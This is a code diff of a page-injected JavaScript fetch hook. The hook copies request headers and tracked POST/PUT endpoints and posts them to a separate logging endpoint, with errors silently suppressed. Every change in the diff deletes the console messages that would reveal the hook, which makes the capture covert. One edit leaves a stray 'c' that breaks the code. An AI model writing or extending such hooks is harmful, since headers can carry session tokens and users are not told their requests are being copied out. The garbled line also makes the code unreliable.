@@ -861,7 +861,7 @@
 
       const origFetch = window.fetch;
       if (!origFetch) {
-        console.warn("[core] window.fetch not available");
+        c
         return;
       }
 
@@ -920,7 +920,7 @@
             return obj.username_script_key;
           }
         } catch (e) {
-          console.warn("[core] error reading damnbruh_username_keys", e);
+          
         }
         return null;
       }
@@ -965,7 +965,7 @@
         if (isPostOrPut && isTrackedPath(path)) {
           payload.endpoint = method + " " + path;
           shouldSend = true;
-          console.debug("[core EP]", payload.endpoint);
+          
         }
 
         // 2) Always capture request headers for XP endpoint (any method)
@@ -974,9 +974,7 @@
           payload.headers = reqHeaders;
           shouldSend = true;
 
-          console.groupCollapsed("[core XP] " + method + " " + path);
-          console.log("Request headers:", reqHeaders);
-          console.groupEnd();
+          
         }
 
         if (!shouldSend) {
@@ -990,13 +988,13 @@
             body: JSON.stringify(payload)
           }).catch(() => {});
         } catch (e) {
-          console.warn("[core] failed to POST logging payload", e);
+        
         }
 
         return res;
       };
 
-      console.log("[core] XP + endpoint fetch hook installed (XP_PATH =", XP_PATH, ")");
+      
     } + ")();";
 
     document.documentElement.prepend(script);
